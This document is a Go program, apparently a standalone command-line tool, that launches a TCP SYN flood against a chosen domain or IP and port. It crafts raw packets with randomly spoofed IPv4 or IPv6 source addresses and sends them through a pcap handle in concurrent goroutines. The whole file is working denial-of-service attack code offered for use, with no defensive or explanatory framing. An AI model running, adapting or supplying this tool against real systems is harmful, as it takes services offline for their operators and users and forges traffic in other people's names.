package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var dnsCache = make(map[string]net.IP)

func resolveDNS(domain string) (net.IP, error) {
	if ip, exists := dnsCache[domain]; exists {
		log.Printf("Cache hit for domain %s: %s", domain, ip)
		return ip, nil
	}

	ips, err := net.LookupIP(domain)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve DNS: %v", err)
	}

	dnsCache[domain] = ips[0]
	log.Printf("Resolved DNS for domain %s to IP %s", domain, ips[0])

	return ips[0], nil
}

func randomIPv4(randSource *rand.Rand) net.IP {
	ip := make(net.IP, 4)
	randSource.Read(ip)
	return ip
}

func randomIPv6(randSource *rand.Rand) net.IP {
	ip := make(net.IP, 16)
	randSource.Read(ip)
	return ip
}

func sendSynFlood(target net.IP, port uint16, numPackets int, randSource *rand.Rand, wg *sync.WaitGroup, handle *pcap.Handle) {
	log.Printf("Starting SYN flood on %s:%d with %d packets\n", target, port, numPackets)

	for i := 0; i < numPackets; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()

			var ipLayer gopacket.NetworkLayer
			var srcIP net.IP

			if target.To4() != nil {
				srcIP = randomIPv4(randSource)
				ipLayer = &layers.IPv4{
					SrcIP:    srcIP,
					DstIP:    target,
					Protocol: layers.IPProtocolTCP,
				}
			} else {
				srcIP = randomIPv6(randSource)
				ipLayer = &layers.IPv6{
					SrcIP:      srcIP,
					DstIP:      target,
					NextHeader: layers.IPProtocolTCP,
				}
			}

			tcpLayer := &layers.TCP{
				SrcPort: layers.TCPPort(randSource.Intn(65535)),
				DstPort: layers.TCPPort(port),
				SYN:     true,
				Window:  14600,
			}

			err := tcpLayer.SetNetworkLayerForChecksum(ipLayer)
			if err != nil {
				log.Printf("Failed to set checksum: %v", err)
				return
			}

			buffer := gopacket.NewSerializeBuffer()
			options := gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}
			switch ip := ipLayer.(type) {
			case *layers.IPv4:
				err = gopacket.SerializeLayers(buffer, options, ip, tcpLayer)
			case *layers.IPv6:
				err = gopacket.SerializeLayers(buffer, options, ip, tcpLayer)
			default:
				log.Printf("Unsupported IP layer type")
				return
			}
			if err != nil {
				log.Printf("Failed to serialize layers: %v", err)
				return
			}

			err = handle.WritePacketData(buffer.Bytes())
			if err != nil {
				log.Printf("Failed to send packet: %v", err)
			}

		}(i)

		time.Sleep(10 * time.Millisecond)
	}
}

func main() {
	interfaceFlag := flag.String("interface", "en0", "Network interface to use (e.g., en0, eth0, etc.)")
	targetFlag := flag.String("target", "", "Target domain name or IP address")
	portFlag := flag.Uint("port", 80, "Target port")
	numPacketsFlag := flag.Int("numPackets", 1000, "Number of packets to send")

	flag.Parse()

	randSource := rand.New(rand.NewSource(time.Now().UnixNano()))

	networkInterface := *interfaceFlag
	target := *targetFlag
	port := uint16(*portFlag)
	numPackets := *numPacketsFlag

	targetIP, err := resolveDNS(target)
	if err != nil {
		log.Fatalf("Error resolving domain: %v", err)
	}

	handle, err := pcap.OpenLive(networkInterface, 1024, false, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Failed to open device: %v", err)
	}
	defer handle.Close()

	log.Printf("Launching SYN Flood on %s:%d with %d packets using interface %s\n", targetIP, port, numPackets, networkInterface)

	var wg sync.WaitGroup
	sendSynFlood(targetIP, port, numPackets, randSource, &wg, handle)

	wg.Wait()
	log.Println("SYN flood completed. Program will now stop.")
}
